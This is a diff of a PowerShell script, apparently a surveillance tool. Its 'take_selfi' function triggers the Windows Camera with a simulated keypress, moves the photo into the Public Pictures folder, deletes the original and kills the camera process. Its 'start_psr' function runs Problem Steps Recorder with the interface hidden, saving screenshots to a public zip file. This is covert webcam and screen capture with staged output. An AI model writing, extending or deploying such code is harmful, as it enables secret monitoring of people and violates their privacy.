@@ -1,20 +1,42 @@
 function take_selfi {
-start microsoft.windows.camera:                                                                                                                                                    
-start-sleep 1                                                                                                                                                                      
-Set-Variable -Name wshell -Value (New-Object -ComObject wscript.shell);                                                                                                            
-$wshell.SendKeys('~');                                                                                                                                                             
-start-sleep 1                                                                                                                                                                      
-# Get all processes related to Windows Camera                                                                                                                                      
-Set-Variable -Name cameraProcesses -Value (Get-Process | Where-Object { $_.ProcessName -eq "WindowsCamera" })                                                                      
-                                                                                                                                                                                   
-# If there are any Windows Camera processes running, kill them                                                                                                                     
-if ($cameraProcesses) {                                                                                                                                                            
-    foreach ($process in $cameraProcesses) {                                                                                                                                       
-        Stop-Process -Id $process.Id -Force
+    # Open the Windows Camera app
+    start microsoft.windows.camera:
+    start-sleep 1
+    
+    # Simulate pressing the Enter key to capture a photo
+    Set-Variable -Name wshell -Value (New-Object -ComObject wscript.shell);
+    $wshell.SendKeys('~');
+    start-sleep 1
+    
+    # Get the path to the user's picture folder
+    $userPicturesFolder = [System.Environment]::GetFolderPath("MyPictures")
+    
+    # Get the last picture in the user's picture folder
+    $lastPicture = Get-ChildItem -Path $userPicturesFolder | Sort-Object -Property LastWriteTime -Descending | Select-Object -First 1
+    
+    if ($lastPicture) {
+        # Define the destination folder for the copy
+        $publicPicturesFolder = [System.Environment]::GetFolderPath("Public") + "\Pictures"
+        
+        # Copy the last picture to the public pictures folder
+        Copy-Item -Path $lastPicture.FullName -Destination $publicPicturesFolder
+        
+        # Delete the last picture from the user's picture folder
+        Remove-Item -Path $lastPicture.FullName -Force
+    }
+    
+    # Get all processes related to Windows Camera
+    $cameraProcesses = Get-Process | Where-Object { $_.ProcessName -eq "WindowsCamera" }
+    
+    # If there are any Windows Camera processes running, kill them
+    if ($cameraProcesses) {
+        foreach ($process in $cameraProcesses) {
+            Stop-Process -Id $process.Id -Force
+        }
     }
 }
-}
-                                                                                                                                                                                   
+
+                                                                                                                                                                              
 function start_psr {                                                                                                                                                                
 psr.exe /start /output C:\Users\Public\screenshots.zip /sc 1 /gui 0                                                                                                                                                                                                                                 
 }                                                                                                                                                                                  
